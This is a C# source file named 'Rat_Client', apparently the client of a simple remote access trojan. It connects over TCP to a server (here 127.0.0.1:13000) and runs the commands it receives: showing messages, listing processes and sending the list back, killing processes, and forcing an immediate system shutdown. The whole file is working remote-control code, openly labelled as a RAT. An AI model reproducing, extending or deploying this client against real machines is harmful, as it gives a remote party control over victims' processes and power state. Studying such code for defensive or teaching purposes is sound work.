using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Net;

namespace Rat_Client
{
	class Program
	{
		static NetworkStream stream { get; set; }

		static void Main()
		{
			try
			{
				TcpClient client = new TcpClient("127.0.0.1", 13000);
				stream = client.GetStream();
				Console.WriteLine("Connected to server.");

				while (true)
				{
					string[] input = Receive();

					switch (input[0])
					{
						case "msg":
							Console.WriteLine(input[1]);
							break;
						case "gettsks":
							GetProcesses();
							break;
						case "killtsk":
							KillTask(input[1]);
							break;
						case "shutcowmp":
							Process.Start("shutdown", "/s /f /t 0");
							break;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Client error: " + ex.Message);
			}
		}

		private static string[] Receive()
		{
			byte[] bytes = new byte[1024];
			int bytesRead = stream.Read(bytes, 0, bytes.Length);

			stream.Flush();

			return Encoding.ASCII.GetString(bytes, 0, bytesRead).Split('|');
		}

		public static void GetProcesses()
		{
			Process[] processes = Process.GetProcesses();

			string processesString = "";

			foreach (Process process in processes)
			{
				try
				{
					processesString += $"Process Name: {process.ProcessName}, ID: {process.Id}\n";
				}
				catch (Exception ex)
				{
					processesString += $"Could not retrieve info for process: {process.Id}, Error: {ex.Message}\n";
				}
			}

			Send(processesString);
		}

		public static void Send(string data)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(data + "|");

			stream.Write(bytes, 0, bytes.Length);
		}

		public static void KillTask(string stringProcessID)
		{
			if (!int.TryParse(stringProcessID, out int processId)) return;

			try
			{
				Process process = Process.GetProcessById(processId);

				process.Kill();

				Send($"Process with ID {processId} has been killed. \n");
			}
			catch (ArgumentException)
			{
				Send($"No process found with ID {processId}\n");
			}
			catch (Exception ex)
			{
				Send($"Error killing process: {ex.Message}\n");
			}
		}
	}
}
